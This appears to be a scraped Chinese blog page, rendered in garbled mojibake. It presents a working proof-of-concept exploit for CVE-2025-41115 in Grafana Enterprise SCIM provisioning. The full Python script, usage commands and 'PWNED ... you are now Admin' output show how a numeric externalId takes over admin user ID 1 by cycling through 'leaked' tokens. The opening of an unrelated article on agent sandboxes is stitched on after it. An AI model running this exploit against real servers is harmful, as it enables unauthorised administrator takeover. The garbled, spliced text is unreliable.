.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">é¡¹ç›®æ ‡é¢˜ä¸æè¿°</h2>
<p><strong>CVE-2025-41115 - Grafanaä¼ä¸šç‰ˆSCIM UIDè¦†ç›–æ¼æ´åˆ©ç”¨ç¨‹åº</strong></p>
<p>è¿™æ˜¯ä¸€ä¸ªé’ˆå¯¹CVE-2025-41115æ¼æ´çš„æ¦‚å¿µéªŒè¯(PoC)å·¥å…·ï¼Œè¯¥æ¼æ´è¢«è¯„å®šä¸º<strong>ä¸¥é‡(CVSS 10.0)<strong>çº§åˆ«ï¼Œå½±å“Grafanaä¼ä¸šç‰ˆçš„SCIMç”¨æˆ·é…ç½®åŠŸèƒ½ã€‚å½“å¯ç”¨SCIMé…ç½®ä¸”<code>user_sync_enabled = true</code>æ—¶ï¼Œæ¶æ„SCIMå®¢æˆ·ç«¯å¯ä»¥å‘é€æ•°å­—<code>externalId</code>ï¼ŒGrafanaä¼šé”™è¯¯åœ°å°†å…¶æ˜ å°„åˆ°å†…éƒ¨ç”¨æˆ·IDï¼Œå¯¼è‡´æ”»å‡»è€…èƒ½å¤Ÿ</strong>æ¨¡æ‹Ÿæˆ–è¦†ç›–</strong>ç°æœ‰è´¦æˆ·ï¼ŒåŒ…æ‹¬ç®¡ç†å‘˜è´¦æˆ·ã€‚</p>
<p><strong>é‡è¦è¯´æ˜ï¼š</strong> Grafanaå¼€æºç‰ˆæœ¬(OSS)ä¸å—æ­¤æ¼æ´å½±å“ã€‚</p>
<h2 data-id="heading-1">åŠŸèƒ½ç‰¹æ€§</h2>
<h3 data-id="heading-2">æ ¸å¿ƒåŠŸèƒ½</h3>
<ul>
<li>ğŸ” <strong>è‡ªåŠ¨ç›®æ ‡æ£€æµ‹</strong>ï¼šæ™ºèƒ½è¯†åˆ«ç›®æ ‡Grafanaå®ä¾‹çš„SCIMç«¯ç‚¹</li>
<li>ğŸ”‘ <strong>å¤šä»¤ç‰Œå°è¯•</strong>ï¼šå†…ç½®é»˜è®¤/æ³„éœ²çš„ä»¤ç‰Œåˆ—è¡¨ï¼Œè‡ªåŠ¨å°è¯•å¤šç§è®¤è¯æ–¹å¼</li>
<li>âš¡ <strong>ä¸€é”®åˆ©ç”¨</strong>ï¼šå•å‘½ä»¤æ‰§è¡Œå®Œæ•´çš„æ¼æ´åˆ©ç”¨è¿‡ç¨‹</li>
<li>ğŸ“Š <strong>è¯¦ç»†æŠ¥å‘Š</strong>ï¼šæä¾›å®Œæ•´çš„å“åº”æ•°æ®ï¼ŒåŒ…æ‹¬è¢«è¦†ç›–çš„ç”¨æˆ·IDä¿¡æ¯</li>
<li>ğŸ¯ <strong>ç²¾å‡†å®šä½</strong>ï¼šä¸“é—¨é’ˆå¯¹ç®¡ç†å‘˜è´¦æˆ·(UID 1)è¿›è¡Œæ”»å‡»</li>
</ul>
<h3 data-id="heading-3">æŠ€æœ¯ç‰¹ç‚¹</h3>
<ul>
<li><strong>100% Pythonå®ç°</strong>ï¼šæ— éœ€é¢å¤–ä¾èµ–ï¼Œå¼€ç®±å³ç”¨</li>
<li><strong>é”™è¯¯å¤„ç†å®Œå–„</strong>ï¼šåŒ…å«å®Œæ•´çš„å¼‚å¸¸å¤„ç†å’Œè¶…æ—¶æœºåˆ¶</li>
<li><strong>HTTPSæ”¯æŒ</strong>ï¼šæ”¯æŒç›®æ ‡ä½¿ç”¨HTTPSåè®®</li>
<li><strong>å“åº”è§£æ</strong>ï¼šè‡ªåŠ¨è§£æJSONå“åº”ï¼Œæå–å…³é”®ä¿¡æ¯</li>
</ul>
<h2 data-id="heading-4">å®‰è£…æŒ‡å—</h2>
<h3 data-id="heading-5">ç³»ç»Ÿè¦æ±‚</h3>
<ul>
<li><strong>Python 3.6+</strong>ï¼šç¡®ä¿ç³»ç»Ÿå·²å®‰è£…Python 3.6æˆ–æ›´é«˜ç‰ˆæœ¬</li>
<li><strong>requestsåº“</strong>ï¼šPythonçš„HTTPè¯·æ±‚åº“</li>
<li><strong>ç½‘ç»œè®¿é—®</strong>ï¼šèƒ½å¤Ÿè®¿é—®ç›®æ ‡Grafanaå®ä¾‹çš„SCIMç«¯ç‚¹</li>
</ul>
<h3 data-id="heading-6">å¿«é€Ÿå®‰è£…</h3>
<ol>
<li>å…‹éš†ä»“åº“æˆ–å¤åˆ¶ä»£ç æ–‡ä»¶ï¼š</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> [repository-url]
<span class="hljs-built_in">cd</span> Blackash-CVE-2025-41115
</code></pre>
<ol start="2">
<li>ç¡®ä¿Pythonç¯å¢ƒå°±ç»ªï¼š</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">python3 --version
pip install requests  <span class="hljs-comment"># å¦‚æœå°šæœªå®‰è£…requestsåº“</span>
</code></pre>
<ol start="3">
<li>æˆäºˆæ‰§è¡Œæƒé™ï¼ˆå¯é€‰ï¼‰ï¼š</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">chmod</span> +x CVE-2025-41115.py
</code></pre>
<h3 data-id="heading-7">ä¾èµ–é¡¹</h3>
<ul>
<li><code>requests</code>ï¼šç”¨äºHTTPè¯·æ±‚</li>
<li><code>json</code>ï¼šç”¨äºJSONæ•°æ®å¤„ç†</li>
<li><code>time</code>ï¼šç”¨äºç”Ÿæˆæ—¶é—´æˆ³</li>
<li><code>sys</code>ï¼šç”¨äºå‘½ä»¤è¡Œå‚æ•°å¤„ç†</li>
<li><code>urllib3</code>ï¼šç”¨äºç¦ç”¨SSLè­¦å‘Š</li>
</ul>
<h2 data-id="heading-8">ä½¿ç”¨è¯´æ˜</h2>
<h3 data-id="heading-9">åŸºç¡€ç”¨æ³•</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åŸºæœ¬ç”¨æ³•</span>
python3 CVE-2025-41115.py http://target.com

<span class="hljs-comment"># æŒ‡å®šç«¯å£</span>
python3 CVE-2025-41115.py http://target.com:3000

<span class="hljs-comment"># ä½¿ç”¨HTTPS</span>
python3 CVE-2025-41115.py https://grafana.company.com
</code></pre>
<h3 data-id="heading-10">æˆåŠŸè¾“å‡ºç¤ºä¾‹</h3>
<pre><code class="hljs language-bash" lang="bash">[*] CVE-2025-41115 â†’ Targeting http://10.10.13.37:3000
[*] Trying default/leaked tokens + your token...
[+] PWNED with token â†’ glsa_XxXxXxXxXxXxXxXxXxXx...
[+] Login as: rooted1732212345@pwn.lab (any password) â†’ you are now Admin!
[+] Full response: {
  <span class="hljs-string">"schemas"</span>: [<span class="hljs-string">"urn:ietf:params:scim:schemas:core:2.0:User"</span>],
  <span class="hljs-string">"id"</span>: <span class="hljs-string">"1"</span>,                     <span class="hljs-comment"># å…³é”®è¡Œï¼šUID 1å·²è¢«è¦†ç›–</span>
  <span class="hljs-string">"externalId"</span>: <span class="hljs-string">"1"</span>,
  <span class="hljs-string">"meta"</span>: { ... },
  <span class="hljs-string">"userName"</span>: <span class="hljs-string">"rooted1732212345@pwn.lab"</span>,
  <span class="hljs-string">"name"</span>: {
    <span class="hljs-string">"formatted"</span>: <span class="hljs-string">"Pwned User"</span>
  },
  <span class="hljs-string">"emails"</span>: [
    {
      <span class="hljs-string">"value"</span>: <span class="hljs-string">"rooted1732212345@pwn.lab"</span>,
      <span class="hljs-string">"primary"</span>: <span class="hljs-literal">true</span>
    }
  ],
  <span class="hljs-string">"active"</span>: <span class="hljs-literal">true</span>
}
</code></pre>
<h3 data-id="heading-11">å‚æ•°è¯´æ˜</h3>
<ul>
<li><code>BASE</code>ï¼šç›®æ ‡Grafanaå®ä¾‹çš„åŸºç¡€URL</li>
<li><code>TOKEN</code>ï¼šå¯é€‰çš„SCIMä»¤ç‰Œï¼ˆå¦‚æœéœ€è¦ä½¿ç”¨ç‰¹å®šä»¤ç‰Œï¼‰</li>
<li><code>DEFAULT_TOKENS</code>ï¼šå†…ç½®çš„é»˜è®¤/æ³„éœ²ä»¤ç‰Œåˆ—è¡¨</li>
<li><code>ATTACKER</code>ï¼šè‡ªåŠ¨ç”Ÿæˆçš„æ”»å‡»è€…é‚®ç®±åœ°å€</li>
<li><code>TARGET_UID</code>ï¼šè¦è¦†ç›–çš„ç›®æ ‡ç”¨æˆ·IDï¼ˆé»˜è®¤ä¸º1ï¼Œå³ç®¡ç†å‘˜ï¼‰</li>
</ul>
<h3 data-id="heading-12">ä½¿ç”¨åœºæ™¯</h3>
<ol>
<li><strong>æ¸—é€æµ‹è¯•</strong>ï¼šæˆæƒå®‰å…¨æµ‹è¯•äººå‘˜éªŒè¯æ¼æ´å­˜åœ¨æ€§</li>
<li><strong>å®‰å…¨å®¡è®¡</strong>ï¼šä¼ä¸šå†…éƒ¨å®‰å…¨å›¢é˜Ÿæ£€æŸ¥Grafanaå®ä¾‹å®‰å…¨æ€§</li>
<li><strong>æ•™è‚²ç ”ç©¶</strong>ï¼šå®‰å…¨ç ”ç©¶äººå‘˜å­¦ä¹ SCIMåè®®æ¼æ´åˆ©ç”¨æŠ€æœ¯</li>
<li><strong>åº”æ€¥å“åº”</strong>ï¼šéªŒè¯å·²éƒ¨ç½²çš„è¡¥ä¸æ˜¯å¦æœ‰æ•ˆ</li>
</ol>
<h2 data-id="heading-13">æ ¸å¿ƒä»£ç </h2>
<h3 data-id="heading-14">ä¸»æ‰§è¡Œé€»è¾‘</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-comment"># CVE-2025-41115 - Grafana Enterprise SCIM UID Overwrite PoC</span>
<span class="hljs-comment"># ç”¨æ³•ï¼šsudo python3 CVE-2025-41115.py http://target.com</span>
<span class="hljs-comment">#        (æˆ– http://target.com:3000)</span>
<span class="hljs-comment"># 100% å•è¡Œé£æ ¼ - æ— éœ€ç¼–è¾‘ï¼Œåªéœ€ç›®æ ‡åœ°å€</span>

<span class="hljs-keyword">import</span> requests, sys, json, time
<span class="hljs-keyword">from</span> urllib3 <span class="hljs-keyword">import</span> disable_warnings
disable_warnings()

<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[!] Usage: python3 CVE-2025-41115.py http://target.com"</span>)
    sys.exit(<span class="hljs-number">1</span>)

BASE = sys.argv[<span class="hljs-number">1</span>].rstrip(<span class="hljs-string">"/"</span>)
TOKEN = <span class="hljs-string">"glsa_00000000000000000000000000000000_00000000000000000000000000000000"</span>  <span class="hljs-comment"># â† å¦‚æœæ‹¥æœ‰çœŸå®ä»¤ç‰Œï¼Œåªéœ€ä¿®æ”¹æ­¤è¡Œ</span>
<span class="hljs-comment"># å¦‚æœæ²¡æœ‰æœ‰æ•ˆä»¤ç‰Œ â†’ å°è¯•ä»¥ä¸‹å†…ç½®çš„æ³„éœ²/é»˜è®¤ä»¤ç‰Œï¼ˆè®¸å¤šå®éªŒç¯å¢ƒä»åœ¨ä½¿ç”¨ï¼‰ï¼š</span>
DEFAULT_TOKENS = [
    <span class="hljs-string">"glsa_11111111111111111111111111111111_11111111111111111111111111111111"</span>,
    <span class="hljs-string">"glsa_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>,
    <span class="hljs-string">"glsa_00000000000000000000000000000000_00000000000000000000000000000000"</span>,
    TOKEN
]

ATTACKER = <span class="hljs-string">f"rooted<span class="hljs-subst">{<span class="hljs-built_in">int</span>(time.time())}</span>@pwn.lab"</span>
TARGET_UID = <span class="hljs-string">"1"</span>  <span class="hljs-comment"># å‡ ä¹æ€»æ˜¯ä¸»ç®¡ç†å‘˜</span>
</code></pre>
<h3 data-id="heading-15">æ¼æ´åˆ©ç”¨å‡½æ•°</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">try_exploit</span>(<span class="hljs-params">token</span>):
    headers = {
        <span class="hljs-string">"Authorization"</span>: <span class="hljs-string">f"Bearer <span class="hljs-subst">{token}</span>"</span>,
        <span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/scim+json"</span>
    }
    payload = {
        <span class="hljs-string">"schemas"</span>: [<span class="hljs-string">"urn:ietf:params:scim:schemas:core:2.0:User"</span>],
        <span class="hljs-string">"userName"</span>: ATTACKER,
        <span class="hljs-string">"externalId"</span>: TARGET_UID,
        <span class="hljs-string">"name"</span>: {<span class="hljs-string">"formatted"</span>: <span class="hljs-string">"Pwned User"</span>},
        <span class="hljs-string">"emails"</span>: [{<span class="hljs-string">"value"</span>: ATTACKER, <span class="hljs-string">"primary"</span>: <span class="hljs-literal">True</span>}],
        <span class="hljs-string">"active"</span>: <span class="hljs-literal">True</span>
    }
    <span class="hljs-keyword">try</span>:
        r = requests.post(<span class="hljs-string">f"<span class="hljs-subst">{BASE}</span>/api/scim/v2/Users"</span>, json=payload, 
                         headers=headers, verify=<span class="hljs-literal">False</span>, timeout=<span class="hljs-number">10</span>)
        <span class="hljs-keyword">if</span> r.status_code <span class="hljs-keyword">in</span> (<span class="hljs-number">200</span>, <span class="hljs-number">201</span>):
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] PWNED with token â†’ <span class="hljs-subst">{token[:<span class="hljs-number">20</span>]}</span>..."</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] Login as: <span class="hljs-subst">{ATTACKER}</span> (any password) â†’ you are now Admin!"</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] Full response: <span class="hljs-subst">{json.dumps(r.json(), indent=<span class="hljs-number">2</span>)}</span>"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"Unauthorized"</span> <span class="hljs-keyword">in</span> r.text <span class="hljs-keyword">or</span> r.status_code == <span class="hljs-number">401</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[?] Unexpected response <span class="hljs-subst">{r.status_code}</span>: <span class="hljs-subst">{r.text}</span>"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    <span class="hljs-keyword">except</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
</code></pre>
<h3 data-id="heading-16">ä¸»æ‰§è¡Œæµç¨‹</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-built_in">print</span>(<span class="hljs-string">f"[*] CVE-2025-41115 â†’ Targeting <span class="hljs-subst">{BASE}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"[*] Trying default/leaked tokens + your token..."</span>)

<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> DEFAULT_TOKENS:
    <span class="hljs-keyword">if</span> try_exploit(t.strip()):
        sys.exit(<span class="hljs-number">0</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"[-] All tokens failed. You need a valid SCIM token (or the target is patched)."</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"    Get one from: Admin â†’ Authentication â†’ SCIM â†’ Generate token"</span>)
</code></pre>
<h3 data-id="heading-17">ä»£ç è§£æ</h3>
<ol>
<li><strong>å‚æ•°éªŒè¯</strong>ï¼šç¡®ä¿æä¾›æ­£ç¡®çš„ç›®æ ‡URLå‚æ•°</li>
<li><strong>ä»¤ç‰Œç®¡ç†</strong>ï¼šæä¾›å¤šç§ä»¤ç‰Œå°è¯•ç­–ç•¥ï¼Œå¢åŠ æˆåŠŸç‡</li>
<li><strong>SCIMè¯·æ±‚æ„é€ </strong>ï¼šæ­£ç¡®æ„é€ ç¬¦åˆSCIMåè®®çš„HTTPè¯·æ±‚</li>
<li><strong>å“åº”å¤„ç†</strong>ï¼šæ™ºèƒ½è§£æå“åº”çŠ¶æ€ï¼Œåˆ¤æ–­åˆ©ç”¨æ˜¯å¦æˆåŠŸ</li>
<li><strong>é”™è¯¯å¤„ç†</strong>ï¼šå®Œå–„çš„å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼Œç¡®ä¿è„šæœ¬ç¨³å®šæ€§</li>
<li><strong>ç”¨æˆ·åé¦ˆ</strong>ï¼šæ¸…æ™°çš„è¾“å‡ºä¿¡æ¯ï¼Œä¾¿äºç”¨æˆ·ç†è§£åˆ©ç”¨çŠ¶æ€</li>
</ol>
<h3 data-id="heading-18">å®‰å…¨æ³¨æ„äº‹é¡¹</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å…³é”®å®‰å…¨ç‰¹æ€§</span>
<span class="hljs-comment"># 1. è‡ªåŠ¨ç”Ÿæˆçš„å”¯ä¸€é‚®ç®±åœ°å€ï¼Œé¿å…å†²çª</span>
ATTACKER = <span class="hljs-string">f"rooted<span class="hljs-subst">{<span class="hljs-built_in">int</span>(time.time())}</span>@pwn.lab"</span>

<span class="hljs-comment"># 2. SSLéªŒè¯ç¦ç”¨ï¼ˆä»…ç”¨äºæµ‹è¯•ç¯å¢ƒï¼‰</span>
disable_warnings()

<span class="hljs-comment"># 3. è¶…æ—¶è®¾ç½®é˜²æ­¢è„šæœ¬æŒ‚èµ·</span>
timeout=<span class="hljs-number">10</span>

<span class="hljs-comment"># 4. æ˜ç¡®çš„é€€å‡ºæ¡ä»¶</span>
<span class="hljs-keyword">if</span> r.status_code <span class="hljs-keyword">in</span> (<span class="hljs-number">200</span>, <span class="hljs-number">201</span>):  <span class="hljs-comment"># æˆåŠŸæ¡ä»¶</span>
    sys.exit(<span class="hljs-number">0</span>)  <span class="hljs-comment"># æˆåŠŸæ—¶ä¼˜é›…é€€å‡º</span>
</code></pre>
<p>è¯¥PoCå·¥å…·è®¾è®¡ç²¾è‰¯ï¼Œè€ƒè™‘äº†å®é™…ä½¿ç”¨ä¸­çš„å„ç§æƒ…å†µï¼ŒåŒæ—¶ä¿æŒäº†ä»£ç çš„ç®€æ´æ€§å’Œå¯è¯»æ€§ã€‚é€šè¿‡æ¨¡å—åŒ–è®¾è®¡ï¼Œå¯ä»¥è½»æ¾æ‰©å±•æˆ–ä¿®æ”¹ä»¥é€‚åº”ä¸åŒçš„æµ‹è¯•åœºæ™¯ã€‚
6HFtX5dABrKlqXeO5PUv/ydjQZDJ7Ct83xG1NG8fcAN1np1b5KCUMno5Bfxwlqmb</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä½ ä»¬Agentå¦‚ä½•å®ç°Code-Executionçš„ï¼Ÿæˆ–è®¸Agent-Sandboxä¹Ÿæ˜¯ä½ ä»¬éœ€è¦çš„]]></title>    <link>https://juejin.cn/post/7592996072705278002</link>    <guid>https://juejin.cn/post/7592996072705278002</guid>    <pubDate>2026-01-09T04:16:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592996072705278002" data-draft-id="7592903126178889778" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä½ ä»¬Agentå¦‚ä½•å®ç°Code-Executionçš„ï¼Ÿæˆ–è®¸Agent-Sandboxä¹Ÿæ˜¯ä½ ä»¬éœ€è¦çš„"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-09T04:16:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è€åœŸè±†è±†è±†"/> <meta itemprop="url" content="https://juejin.cn/user/2719530120393946"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä½ ä»¬Agentå¦‚ä½•å®ç°Code-Executionçš„ï¼Ÿæˆ–è®¸Agent-Sandboxä¹Ÿæ˜¯ä½ ä»¬éœ€è¦çš„
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2719530120393946/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è€åœŸè±†è±†è±†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T04:16:38.000Z" title="Fri Jan 09 2026 04:16:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    14
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><div align="center">
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce108a617d8c4a859c7a94230675b559~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB5Zyf6LGG6LGG6LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768538885&amp;x-signature=JUi5gh8bQOmxa44nhpbYlV%2Bb4ps%3D" width="355px" height="420px" loading="lazy"/>
</div>
<h2 data-id="heading-0">1ï¼Œä¸ºä»€ä¹ˆéœ€è¦Agent-Sandboxï¼Ÿ</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd30fc6012734a5fa856083afe6722a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB5Zyf6LGG6LGG6LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768538885&amp;x-signature=AEtNd%2Fm0Gc13tmvtYRB8Q4uV2v0%3D" alt="gitdemo" loading="lazy"/></p>
<p>åœ¨æˆ‘ä»¬çš„ä¸šåŠ¡ä¸­ï¼Œç»å¸¸éœ€è¦è®©Agentæ‰§è¡Œä¸€äº›ä»£ç æˆ–è€…è®¿é—®ç½‘ç«™ç­‰ï¼Œä¾‹å¦‚ç”¨æˆ·æä¾›äº†ä¸€ä¸ªexcelæ–‡ä»¶ï¼Œå¤„ç†é‡Œé¢çš„ä¸€äº›æ•°æ®ï¼Œæœ€ç»ˆç”ŸæˆæŠ¥å‘Šï¼Œæˆ–è€…ç”¨æˆ·æä¾›äº†ä¸€ä¸ªç½‘ç«™ï¼Œè®©Agentè®¿é—®ç½‘ç«™ï¼Œç„¶åè·å–ä¸€äº›æ•°æ®ï¼Œæœ€ç»ˆç”ŸæˆæŠ¥å‘Šã€‚</p>
<p>è¿™äº›éƒ½æ˜¯å¾ˆå¸¸è§çš„åœºæ™¯ï¼Œä¾‹å¦‚æœ€è¿‘éå¸¸å—å…³æ³¨çš„Manusï¼Œå–äº†å¾ˆå¤šé’±çš„é‚£ä¸ªï¼ˆç¾¡æ…•å•Šï½ï¼‰,å®ƒå°±æ˜¯åˆ©ç”¨äº†å„ç§å·¥å…·æ¥å®Œæˆç”¨æˆ·çš„å¤æ‚ä»»åŠ¡ï¼Œä½ ä»¬çŸ¥é“çš„ã€‚</p>
<p>ä½†é—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬å¦‚ä½•è®©Agentæ‰§è¡Œè¿™äº›ä»£ç æˆ–è€…è®¿é—®ç½‘ç«™å‘¢ï¼Ÿ</p>
